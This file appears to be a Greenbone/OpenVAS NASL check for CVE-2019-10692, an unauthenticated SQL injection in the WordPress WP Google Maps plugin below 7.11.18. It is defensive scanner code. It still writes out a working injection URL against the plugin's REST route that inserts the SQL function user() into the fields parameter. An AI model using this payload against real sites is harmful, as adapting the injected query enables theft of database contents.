# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142238");
  script_version("2019-04-10T13:08:52+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:08:52 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2019-04-10 11:55:03 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2019-10692");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WordPress WP Google Maps Plugin < 7.11.18 SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"WordPress WP Google Maps plugin is prone to an unauthenticated SQL injection
  vulnerability.");

  script_tag(name:"insight", value:"The file includes/class.rest-api.php in the REST API does not sanitize field
  names before a SELECT statement which may lead to a SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"WordPress WP Google Maps plugin before version 7.11.18.");

  script_tag(name:"solution", value:"Update to version 7.11.18 or later.");

  script_xref(name:"URL", value:"https://wordpress.org/plugins/wp-google-maps/#developers");
  script_xref(name:"URL", value:"https://github.com/rapid7/metasploit-framework/pull/11698");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();
# '-' causes trouble in the injection
vt_str = str_replace(string: vt_strings['default'], find: "-", replace: "_");
rand = rand_str(length: 4, charset: "01234456789");
marker = vt_str + "_" + rand;

url = "/index.php?rest_route=/wpgmza/v1/markers/&filter=%7B%22%22%3Atrue%7D" +
      "&fields=user%28%29%20as%20" + vt_str + "%5F" + rand;

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && marker >< res) {
  report = 'It was possible to inject the function user() in the SQL statement.\n\nResponse:\n\n' +
            res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
